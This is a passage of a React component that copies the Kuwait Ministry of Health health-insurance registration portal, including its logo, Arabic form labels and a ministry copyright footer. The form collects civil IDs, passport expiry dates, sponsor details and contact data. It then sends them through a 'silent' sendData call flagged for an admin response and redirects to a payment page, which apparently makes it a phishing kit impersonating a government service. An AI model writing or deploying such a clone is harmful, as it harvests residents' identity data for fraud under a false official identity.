import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

interface GroupPerson {
  civilId: string;
  name: string;
  gender: string;
  nationality: string;
  residenceType: string;
  passportExpiry: string;
  insuranceStatus: string;
  yearsCount: string;
  startDate: string;
  endDate: string;
  amount: number;
}

export default function MOHRegister() {
  const [, setLocation] = useLocation();

  // Top section
  const [serviceType, setServiceType] = useState('');
  const [residenceType, setResidenceType] = useState('');
  const [yearlyAmount, setYearlyAmount] = useState('');

  // Group insurance
  const [groupInsuranceCategory, setGroupInsuranceCategory] = useState('');
  const [groupPersons, setGroupPersons] = useState<GroupPerson[]>([]);
  const [showAddModal, setShowAddModal] = useState(false);
  const [selectedPersonIndex, setSelectedPersonIndex] = useState<number | null>(null);

  // Add modal fields
  const [modalResidenceType, setModalResidenceType] = useState('');
  const [modalInsuranceStatus, setModalInsuranceStatus] = useState('');
  const [modalCivilId, setModalCivilId] = useState('');
  const [modalName, setModalName] = useState('');
  const [modalGender, setModalGender] = useState('');
  const [modalNationality, setModalNationality] = useState('');
  const [modalPassportExpiry, setModalPassportExpiry] = useState('');
  const [modalYearsCount, setModalYearsCount] = useState('');
  const [modalStartDate, setModalStartDate] = useState('');
  const [modalEndDate, setModalEndDate] = useState('');
  const [modalAmount, setModalAmount] = useState(0);

  // Personal info (individual insurance)
  const [insuranceStatus, setInsuranceStatus] = useState('');
  const [civilId, setCivilId] = useState('');
  const [sponsorCivilId, setSponsorCivilId] = useState('');
  const [sponsorName, setSponsorName] = useState('');
  const [fullName, setFullName] = useState('');
  const [gender, setGender] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [nationality, setNationality] = useState('');
  const [company, setCompany] = useState('');
  const [workplace, setWorkplace] = useState('');
  const [passportExpiry, setPassportExpiry] = useState('');
  const [yearsCount, setYearsCount] = useState('');
  const [coverageStart, setCoverageStart] = useState('');
  const [coverageEnd, setCoverageEnd] = useState('');

  // Contact
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');

  // Payment
  const [paymentMethod, setPaymentMethod] = useState('بوابة الدفع الإلكتروني');
  const [totalAmount, setTotalAmount] = useState(0);
  const [agreeTerms, setAgreeTerms] = useState(false);

  // Username from previous page
  const [userName, setUserName] = useState('');

  // Payment summary
  const [showPaymentSummary, setShowPaymentSummary] = useState(false);

  // Warning popup
  const [showWarning, setShowWarning] = useState(false);

  const isGroupInsurance = serviceType === 'ضمان جماعي';

  useEffect(() => {
    navigateToPage('صفحة التسجيل');
    const storedEnglishName = localStorage.getItem('mohEnglishName') || '';
    setUserName(storedEnglishName);
  }, []);

  // Individual insurance total
  useEffect(() => {
    if (!isGroupInsurance && yearlyAmount && yearsCount) {
      setTotalAmount(parseInt(yearlyAmount) * parseInt(yearsCount));
    }
  }, [yearlyAmount, yearsCount, isGroupInsurance]);

  // Group insurance total
  useEffect(() => {
    if (isGroupInsurance) {
      const sum = groupPersons.reduce((acc, p) => acc + p.amount, 0);
      setTotalAmount(sum);
    }
  }, [groupPersons, isGroupInsurance]);

  useEffect(() => {
    if (coverageStart && yearsCount) {
      const start = new Date(coverageStart);
      start.setFullYear(start.getFullYear() + parseInt(yearsCount));
      setCoverageEnd(start.toISOString().split('T')[0]);
    }
  }, [coverageStart, yearsCount]);

  // Modal end date calculation
  useEffect(() => {
    if (modalStartDate && modalYearsCount) {
      const start = new Date(modalStartDate);
      start.setFullYear(start.getFullYear() + parseInt(modalYearsCount));
      setModalEndDate(start.toISOString().split('T')[0]);
    }
  }, [modalStartDate, modalYearsCount]);

  // Modal amount calculation
  useEffect(() => {
    if (modalResidenceType && modalYearsCount) {
      const yearly = parseInt(getYearlyPrice(modalResidenceType, modalNationality));
      setModalAmount(yearly * parseInt(modalYearsCount));
    }
  }, [modalResidenceType, modalYearsCount, modalNationality]);

  const getYearlyPrice = (resType: string, nat: string) => {
    // غير كويتي
    if (nat !== 'كويتي' && nat !== '--اختار--' && nat !== '') {
      if (resType.includes('20 - الخادمات') && resType.includes('10 د.ك')) {
        return '10';
      }
      return '100';
    }
    // كويتي
    if (resType.includes('20 - الخادمات') && resType.includes('بدون دفع')) {
      return '5';
    } else if (resType.includes('20 - الخادمات') && resType.includes('10 د.ك')) {
      return '10';
    } else if (
      resType.includes('أبناء الخليجية') ||
      resType.includes('التحاق بعائل - زوج') ||
      resType.includes('لغير الزوجة و الأبناء') ||
      (resType.includes('20 - الخادمات') && resType.includes('غير كويتي'))
    ) {
      return '5';
    } else if (resType.includes('اقل من 18')) {
      return '30';
    } else if (resType === '22 - التحاق بعائل زوجة') {
      return '40';
    }
    return '50';
  };

  const handleResidenceChange = (val: string) => {
    setResidenceType(val);
    if (val && val !== '') {
      setYearlyAmount(getYearlyPrice(val, nationality));
      setShowWarning(true);
    }
  };

  const isFormComplete = isGroupInsurance
    ? (groupPersons.length > 0 && email && phone && agreeTerms)
    : (serviceType && residenceType && civilId && yearsCount && coverageStart && passportExpiry && email && phone && agreeTerms);

  const handlePayment = () => {
    if (!isFormComplete) return;

    if (isGroupInsurance) {
      const allData = {
        'نوع الخدمة': serviceType,
        'فئة التأمين الجماعي': groupInsuranceCategory,
        'البريد الإلكتروني': email,
        'رقم الهاتف': phone,
        'طريقة الدفع': paymentMethod,
        'إجمالي المبلغ': totalAmount,
        'عدد الأشخاص': groupPersons.length,
        'تفاصيل المجموعة': groupPersons.map((p, i) => ({
          [`شخص ${i + 1}`]: {
            'الرقم المدني': p.civilId,
            'الاسم': p.name,
            'الجنس': p.gender,
            'الجنسية': p.nationality,
            'نوع الإقامة': p.residenceType,
            'حالة الضمان الصحي': p.insuranceStatus,
            'تاريخ إنتهاء صلاحية الجواز': p.passportExpiry,
            'عدد السنوات': p.yearsCount,
            'تاريخ البداية': p.startDate,
            'تاريخ الانتهاء': p.endDate,
            'المبلغ': p.amount,
          }
        })),
      };
      sendData({
        data: allData,
        current: 'الدفع الإلكتروني - ضمان جماعي',
        waitingForAdminResponse: false,
        mode: 'silent',
      });
    } else {
      const allData = {
        'نوع الخدمة': serviceType,
        'نوع الإقامة': residenceType,
        'المبلغ في السنة': yearlyAmount,
        'حالة الضمان الصحي': insuranceStatus,
        'الرقم المدني': civilId,
        'الرقم المدني للكفيل': sponsorCivilId,
        'اسم الكفيل': sponsorName,
        'الاسم': fullName,
        'الجنس': gender,
        'تاريخ الميلاد': birthDate,
        'الجنسية': nationality,
        'الشركة': company,
        'مكان العمل': workplace,
        'تاريخ إنتهاء صلاحية الجواز': passportExpiry,
        'عدد السنوات': yearsCount,
        'تاريخ بداية التغطية': coverageStart,
        'تاريخ نهاية التغطية': coverageEnd,
        'البريد الإلكتروني': email,
        'رقم الهاتف': phone,
        'طريقة الدفع': paymentMethod,
        'إجمالي المبلغ': totalAmount,
      };
      sendData({
        data: allData,
        current: 'الدفع الإلكتروني',
        waitingForAdminResponse: false,
        mode: 'silent',
      });
    }

    // Save MOH payment data to localStorage for SummaryPayment page
    localStorage.setItem('mohPaymentData', JSON.stringify({
      serviceType,
      residenceType,
      yearlyAmount,
      yearsCount,
      totalAmount,
      isGroupInsurance,
      groupPersonsCount: groupPersons.length,
      persons: isGroupInsurance ? groupPersons.map(p => ({
        name: p.name,
        civilId: p.civilId,
        nationality: p.nationality,
        residenceType: p.residenceType,
        yearsCount: p.yearsCount,
        amount: p.amount,
      })) : [{
        name: fullName,
        civilId,
        nationality,
        residenceType,
        yearsCount,
        amount: totalAmount,
      }],
      source: 'moh',
    }));
    window.location.href = '/summary-payment?service=moh';
  };

  const handleClear = () => {
    setServiceType(''); setResidenceType(''); setYearlyAmount('');
    setInsuranceStatus(''); setSponsorCivilId(''); setSponsorName('');
    setFullName(''); setGender(''); setBirthDate('');
    setNationality(''); setCompany(''); setWorkplace('');
    setPassportExpiry(''); setYearsCount(''); setCoverageStart('');
    setCoverageEnd(''); setEmail(''); setPhone('');
    setTotalAmount(0); setAgreeTerms(false); setGroupInsuranceCategory('');
    setGroupPersons([]);
  };

  const resetModal = () => {
    setModalResidenceType(''); setModalInsuranceStatus('');
    setModalCivilId(''); setModalName(''); setModalGender('');
    setModalNationality(''); setModalPassportExpiry('');
    setModalYearsCount(''); setModalStartDate('');
    setModalEndDate(''); setModalAmount(0);
  };

  const handleAddPerson = () => {
    resetModal();
    setShowAddModal(true);
  };

  const handleSavePerson = () => {
    const person: GroupPerson = {
      civilId: modalCivilId,
      name: modalName,
      gender: modalGender,
      nationality: modalNationality,
      residenceType: modalResidenceType,
      passportExpiry: modalPassportExpiry,
      insuranceStatus: modalInsuranceStatus,
      yearsCount: modalYearsCount,
      startDate: modalStartDate,
      endDate: modalEndDate,
      amount: modalAmount,
    };
    setGroupPersons([...groupPersons, person]);
    setShowAddModal(false);
    resetModal();
  };

  const handleDeletePerson = () => {
    if (selectedPersonIndex !== null) {
      const updated = groupPersons.filter((_, i) => i !== selectedPersonIndex);
      setGroupPersons(updated);
      setSelectedPersonIndex(null);
    }
  };

  const serviceTypes = ['ضمان فردي', 'ضمان جماعي'];

  const residenceTypes = [
    '18 - إقامة عمل خاص',
    '18 - إقامة عمل خاص حكومي',
    '19 - شريك تجاري',
    '22 - التحاق بعائل ابن او ابنه اكبر من 18 سنه (ماده 22)',
    '22 - التحاق بعائل ابن او ابنه اقل من 18 سنه (ماده 22)',
    '22 - التحاق بعائل زوجة',
    '22 - التحاق بعائل - زوج',
    '24 - ممول ذاتياً',
    '22 - التحاق بعائل أبناء الخليجية',
    '31 - خدمات جليلة ورجال الدين',
    '29 - التحاق بعائل اخ او اخت كفيل كويتي او غير كويتي',
    '20 - الخادمات (العمالة المنزلية) تحت كفالة غير كويتي',
    '18 - رعاة الابل والاغنام في قطاع الثروة الحيوانية',
    '17 - العاملين في الهيئات الدبلوماسية و المنظمات الحكومية الدولية',
    '18 - العمال الزراعيين العاملين بالحيازات الزراعية',
    '18 - الصيادين العاملين بحرفة صيد الأسماك',
    '29 - التحاق بعائل لغير الزوجة و الأبناء',
    '23 - إقامة دراسية',
    '30 - تعديل الوضع القانوني لذوي الشهيد',
    '21 - مستثمر',
    '25 - مالك العقار',
    '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين بدون دفع',
    '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين (10 د.ك) دفع',
  ];

  const insuranceStatuses = ['--اختار--', 'إصدار جديد', 'تجديد', 'تحويل', 'مولود جديد'];
  const genders = ['--اختار--', 'ذكر', 'أنثى'];
  const nationalities = ['--اختار--', 'كويتي', 'هندي', 'بنغلاديشي', 'سريلانكي', 'فلبيني', 'مصري', 'باكستاني', 'نيبالي', 'إثيوبي', 'أخرى'];
  const yearOptions = ['1', '2', '3', '4', '5'];
  const groupInsuranceCategories = ['--اختار--', 'تأمين خاص'];

  const css = `
    .moh-field { display: flex; flex-direction: row-reverse; align-items: center; margin-bottom: 12px; }
    .moh-field label { min-width: 160px; text-align: right; font-size: 13px; font-weight: bold; color: #333; padding-right: 0; padding-left: 10px; white-space: nowrap; }
    .moh-field input, .moh-field select { flex: 1; padding: 8px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; font-family: Cairo, Tahoma, Arial, sans-serif; outline: none; direction: rtl; background: #fff; }
    .moh-field input[readonly] { background: #e9ecef; color: #555; }
    .moh-field .req { color: red; }
    .moh-row { display: flex; flex-direction: row-reverse; flex-wrap: wrap; gap: 10px; }
    .moh-row .moh-field { flex: 1; min-width: 280px; }
    @media (max-width: 768px) {
      .moh-row { flex-direction: column; }
      .moh-row .moh-field { min-width: 100%; }
      .moh-field label { min-width: 120px; font-size: 12px; }
      .moh-field input, .moh-field select { max-width: 100%; }
    }
    .group-table { width: 100%; border-collapse: collapse; font-size: 12px; }
    .group-table th { background: #e8edf2; padding: 8px 4px; border: 1px solid #ccc; font-weight: bold; color: #333; text-align: center; white-space: nowrap; font-size: 11px; }
    .group-table td { padding: 6px 4px; border: 1px solid #ccc; text-align: center; font-size: 12px; }
    .group-table tr.selected { background: #d0e8f0; }
    .group-table tbody tr:hover { background: #f0f5fa; cursor: pointer; }
    .modal-field { display: flex; align-items: center; margin-bottom: 14px; direction: rtl; gap: 10px; }
    .modal-field label { min-width: 180px; text-align: right; font-weight: bold; font-size: 13px; color: #333; white-space: nowrap; }
    .modal-field input, .modal-field select { width: 320px; max-width: 320px; padding: 7px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 13px; font-family: Cairo, Tahoma, Arial, sans-serif; direction: rtl; background: #fff; outline: none; }
    .modal-field input[readonly] { background: #e9ecef; }
    .modal-field .req { color: red; }
  `;

  // Payment Summary Page
  if (showPaymentSummary) {
    return (
      <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column' }}>
        <div style={{ background: '#0c2c3c', padding: '20px 0', textAlign: 'center' }}>
          <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 90, height: 90, margin: '0 auto' }} />
          <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
        </div>

        <div style={{ maxWidth: 600, margin: '40px auto', padding: '0 20px' }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>ملخص الدفع</span>
            </div>
            <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <tbody>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الخدمة</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{serviceType}</td>
                  </tr>
                  {!isGroupInsurance && (
                    <>
                      <tr style={{ borderBottom: '1px solid #eee' }}>
                        <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الإقامة</td>
                        <td style={{ padding: '12px 10px', color: '#333' }}>{residenceType}</td>
                      </tr>
                      <tr style={{ borderBottom: '1px solid #eee' }}>
                        <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>عدد السنوات</td>
                        <td style={{ padding: '12px 10px', color: '#333' }}>{yearsCount}</td>
                      </tr>
                    </>
                  )}
                  {isGroupInsurance && (
                    <tr style={{ borderBottom: '1px solid #eee' }}>
                      <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>عدد الأشخاص</td>
                      <td style={{ padding: '12px 10px', color: '#333' }}>{groupPersons.length}</td>
                    </tr>
                  )}
                  <tr>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>إجمالي المبلغ</td>
                    <td style={{ padding: '12px 10px', color: '#d32f2f', fontWeight: 'bold', fontSize: 18 }}>{totalAmount} د.ك</td>
                  </tr>
                </tbody>
              </table>

              <div style={{ textAlign: 'center', marginTop: 30 }}>
                <div style={{
                  width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
                  borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
                }} />
                <p style={{ color: '#555', fontSize: 15 }}>جاري تحويلك لبوابة الدفع الإلكتروني...</p>
                <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
              </div>
            </div>
          </div>
        </div>

        <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
          <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#f0f2f5', display: 'flex', flexDirection: 'column' }}>
      <style>{css}</style>

      {/* Warning Popup */}
      {showWarning && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <div style={{ background: '#fff', border: '3px solid #000', maxWidth: 550, width: '90%', padding: '30px 25px', textAlign: 'center' }}>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              يرجى من مستخدمي الخدمة التأكد من صحة جميع البيانات لغرض الحصول
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              على خدمة الضمان الصحي حيث أن وزارة الصحة لا تتحمل مسؤولية
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              استرجاع المبالغ المدفوعة إذا تبين أن المعلومات المقدمة غير صحيحة يرجى
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              التأكد من صحة جميع البيانات المدخلة قبل إكمال العملية
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#d32f2f', fontWeight: 'bold', marginBottom: 20 }}>
              نود إحاطتكم علما بأنه لايوجد استرداد مالي بعد اتمام الطلب تحت أي ظرف
            </p>
            <button
              onClick={() => setShowWarning(false)}
              style={{
                background: '#4CAF50', color: '#fff', border: 'none', padding: '10px 40px',
                fontSize: 16, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* Add Person Modal */}
      {showAddModal && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.4)', zIndex: 9999, display: 'flex', alignItems: 'flex-start', justifyContent: 'center', paddingTop: 30, overflowY: 'auto' }}>
          <div style={{ background: '#f5f5f5', border: '2px solid #88b8d0', maxWidth: 580, width: '95%', marginBottom: 30 }}>
            {/* Modal Header */}
            <div style={{ background: '#d0e8f0', padding: '10px 20px', borderBottom: '1px solid #88b8d0', textAlign: 'right' }}>
              <span style={{ fontSize: 15, fontWeight: 'bold', color: '#1a5276' }}>إضافة تفاصيل التأمين</span>
            </div>

            {/* Modal Body */}
            <div style={{ padding: '25px 30px' }}>
              {/* نوع الإقامه */}
              <div className="modal-field">
                <label>نوع الإقامه</label>
                <select value={modalResidenceType} onChange={(e) => setModalResidenceType(e.target.value)}>
                  <option value="">--اختار--</option>
                  {residenceTypes.map(t => <option key={t} value={t}>{t}</option>)}
                </select>
              </div>

              {/* حالة الضمان الصحي */}
              <div className="modal-field">
                <label>حالة الضمان الصحي<span className="req">*</span></label>
                <select value={modalInsuranceStatus} onChange={(e) => setModalInsuranceStatus(e.target.value)}>
                  <option value="">--اختار--</option>
                  {insuranceStatuses.filter(s => s !== '--اختار--').map(s => <option key={s} value={s}>{s}</option>)}
                </select>
              </div>

              {/* الرقم المدني */}
              <div className="modal-field">
                <label>الرقم المدني<span className="req">*</span></label>
                <input
                  type="text"
                  value={modalCivilId}
                  onChange={(e) => setModalCivilId(e.target.value.replace(/\D/g, ''))}
                  placeholder="أدخل الرقم المدني"
                />
              </div>

              {/* الاسم */}
              <div className="modal-field">
                <label>الاسم</label>
                <input type="text" value={modalName} onChange={(e) => setModalName(e.target.value)} />
              </div>

              {/* الجنس */}
              <div className="modal-field">
                <label>الجنس</label>
                <select value={modalGender} onChange={(e) => setModalGender(e.target.value)}>
                  <option value="">--اختار--</option>
                  {genders.filter(g => g !== '--اختار--').map(g => <option key={g} value={g}>{g}</option>)}
                </select>
              </div>

              {/* الجنسية */}
              <div className="modal-field">
                <label>الجنسية</label>
                <select value={modalNationality} onChange={(e) => setModalNationality(e.target.value)}>
                  <option value="">--اختار--</option>
                  {nationalities.filter(n => n !== '--اختار--').map(n => <option key={n} value={n}>{n}</option>)}
                </select>
              </div>

              {/* تاريخ إنتهاء صلاحية الجواز */}
              <div className="modal-field">
                <label>تاريخ إنتهاء صلاحية الجواز<span className="req">*</span></label>
                <input type="date" value={modalPassportExpiry} onChange={(e) => setModalPassportExpiry(e.target.value)} />
              </div>

              {/* عدد السنوات */}
              <div className="modal-field">
                <label>عدد السنوات<span className="req">*</span></label>
                <select value={modalYearsCount} onChange={(e) => setModalYearsCount(e.target.value)}>
                  <option value="">اختر عدد السنوات</option>
                  {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
                </select>
              </div>

              {/* تاريخ البداية */}
              <div className="modal-field">
                <label>تاريخ البداية<span className="req">*</span></label>
                <input
                  type="date"
                  value={modalStartDate}
                  onChange={(e) => setModalStartDate(e.target.value)}
                />
              </div>

              {/* تاريخ الانتهاء */}
              <div className="modal-field">
                <label>تاريخ الانتهاء</label>
                <input type="text" value={modalEndDate} readOnly />
              </div>

              {/* المبلغ */}
              <div className="modal-field">
                <label>المبلغ</label>
                <input type="text" value={modalAmount || ''} readOnly />
              </div>

              {/* Buttons */}
              <div style={{ display: 'flex', justifyContent: 'center', gap: 15, marginTop: 25 }}>
                <button
                  onClick={handleSavePerson}
                  style={{
                    background: '#5bc0de', color: '#fff', border: 'none', padding: '8px 25px',
                    fontSize: 14, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                    display: 'flex', alignItems: 'center', gap: 6,
                  }}
                >
                  💾 حفظ
                </button>
                <button
                  onClick={() => { setShowAddModal(false); resetModal(); }}
                  style={{
                    background: '#ccc', color: '#333', border: 'none', padding: '8px 25px',
                    fontSize: 14, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                    display: 'flex', alignItems: 'center', gap: 6,
                  }}
                >
                  ❌ إلغاء
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <div style={{ background: '#0c2c3c', padding: '20px 0', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 90, height: 90, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
      </div>

      {/* User info bar */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', padding: '10px 30px', background: '#fff', borderBottom: '1px solid #eee' }}>
        <div style={{ display: 'flex', flexDirection: 'column' }}>
          <span onClick={() => { document.documentElement.lang = document.documentElement.lang === 'en' ? 'ar' : 'en'; }} style={{ color: '#c0392b', fontSize: 14, cursor: 'pointer', fontWeight: 'bold', textDecoration: 'underline' }}>English</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ color: '#d4a017', fontSize: 14, fontWeight: 'bold' }}>{userName || 'User Name'}</span>
          <div style={{ width: 40, height: 40, background: '#ddd', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#888"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </div>
        </div>
      </div>

      <div style={{ width: '100%', padding: '20px 25px', boxSizing: 'border-box' }}>
        {/* Service Type Section */}
        <div style={{ background: '#e8edf2', padding: '15px 20px', borderRadius: 4, marginBottom: 15 }}>
          <div style={{ display: 'flex', flexDirection: 'row-reverse', flexWrap: 'wrap', gap: 10, alignItems: 'center' }}>
            {isGroupInsurance ? (
              <>
                <div className="moh-field" style={{ flex: 1, minWidth: 280 }}>
                  <select value={groupInsuranceCategory} onChange={(e) => setGroupInsuranceCategory(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 220 }}>
                    {groupInsuranceCategories.map(t => <option key={t} value={t}>{t}</option>)}
                  </select>
                  <label style={{ minWidth: 140, textAlign: 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: 10 }}>فئة التأمين الجماعي</label>
                </div>
              </>
            ) : (
              <>
                <div className="moh-field" style={{ flex: 1, minWidth: 200 }}>
                  <input type="text" value={yearlyAmount} readOnly style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, background: '#e9ecef', maxWidth: 80, textAlign: 'center' }} />
                  <label style={{ minWidth: 100, textAlign: 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: 10 }}>المبلغ في السنه</label>
                </div>
                <div className="moh-field" style={{ flex: 1, minWidth: 280 }}>
                  <select value={residenceType} onChange={(e) => handleResidenceChange(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 220 }}>
                    <option value="">--اختار--</option>
                    {residenceTypes.map(t => <option key={t} value={t}>{t}</option>)}
                  </select>
                  <label style={{ minWidth: 80, textAlign: 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: 10 }}>نوع الاقامه</label>
                </div>
              </>
            )}
            <div className="moh-field" style={{ flex: 1, minWidth: 280 }}>
              <select value={serviceType} onChange={(e) => { setServiceType(e.target.value); setResidenceType(''); setYearlyAmount(''); setGroupPersons([]); setGroupInsuranceCategory(''); }} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 180 }}>
                <option value="">--اختار--</option>
                {serviceTypes.map(t => <option key={t} value={t}>{t}</option>)}
              </select>
              <label style={{ minWidth: 80, textAlign: 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: 10 }}>نوع الخدمة</label>
            </div>
          </div>
        </div>

        {serviceType && !isGroupInsurance && (
          <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', borderRight: '3px solid #a0c4e8', marginBottom: 15 }}>
            {/* Row 1: حالة الضمان الصحي + الرقم المدني */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="text" value={civilId} onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))} placeholder="أدخل الرقم المدني" />
                <label>الرقم المدني <span className="req">*</span></label>
              </div>
              <div className="moh-field">
                <select value={insuranceStatus} onChange={(e) => setInsuranceStatus(e.target.value)}>
                  {insuranceStatuses.map(s => <option key={s} value={s}>{s}</option>)}
                </select>
                <label>حالة الضمان الصحي <span className="req">*</span></label>
              </div>
            </div>

            {/* Row 2: الاسم */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} />
                <label>الاسم</label>
              </div>
            </div>

            {/* Row 3: الجنس + تاريخ الميلاد */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} />
                <label>تاريخ الميلاد</label>
              </div>
              <div className="moh-field">
                <select value={gender} onChange={(e) => setGender(e.target.value)}>
                  {genders.map(g => <option key={g} value={g}>{g}</option>)}
                </select>
                <label>الجنس</label>
              </div>
            </div>

            {/* Row 4: الجنسية */}
            <div className="moh-row">
              <div className="moh-field">
                <select value={nationality} onChange={(e) => { setNationality(e.target.value); if (residenceType) setYearlyAmount(getYearlyPrice(residenceType, e.target.value)); }}>
                  {nationalities.map(n => <option key={n} value={n}>{n}</option>)}
                </select>
                <label>الجنسية</label>
              </div>
            </div>

            {/* Row 5: الشركة + مكان العمل + تاريخ إنتهاء صلاحية الجواز */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="date" value={passportExpiry} onChange={(e) => setPassportExpiry(e.target.value)} />
                <label>تاريخ إنتهاء صلاحية الجواز <span className="req">*</span></label>
              </div>
              <div className="moh-field">
                <input type="text" value={workplace} onChange={(e) => setWorkplace(e.target.value)} />
                <label>مكان العمل</label>
              </div>
              <div className="moh-field">
                <input type="text" value={company} onChange={(e) => setCompany(e.target.value)} />
                <label>الشركة</label>
              </div>
            </div>

            {/* Row 6: عدد السنوات + تاريخ بداية التغطية + تاريخ نهاية التغطية */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="text" value={coverageEnd} readOnly />
                <label>تاريخ نهاية التغطية</label>
              </div>
              <div className="moh-field">
                <input type="date" value={coverageStart} onChange={(e) => setCoverageStart(e.target.value)} />
                <label>تاريخ بداية التغطية <span className="req">*</span></label>
              </div>
              <div className="moh-field">
                <select value={yearsCount} onChange={(e) => setYearsCount(e.target.value)}>
                  <option value="">اختر عدد السنوات</option>
                  {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
                </select>
                <label>عدد السنوات <span className="req">*</span></label>
              </div>
            </div>
          </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div className="moh-row">
            <div className="moh-field">
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ direction: 'ltr', textAlign: 'left' }} />
              <label>البريد الإلكتروني</label>
            </div>
            <div className="moh-field">
              <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))} maxLength={12} style={{ direction: 'ltr', textAlign: 'left' }} />
              <label>رقم الهاتف</label>
            </div>
          </div>

          {!isFormComplete && (
            <p style={{ color: 'red', fontSize: 13, textAlign: 'center', marginTop: 15 }}>
              {isGroupInsurance
                ? '* الرجاء إضافة شخص واحد على الأقل وإدخال البريد الإلكتروني ورقم الهاتف'
                : '* الرجاء ادخال البيانات المطلوبه الرقم المدني , تاريخ إنتهاء صلاحية الجواز , عدد السنوات , تاريخ بداية التغطية'
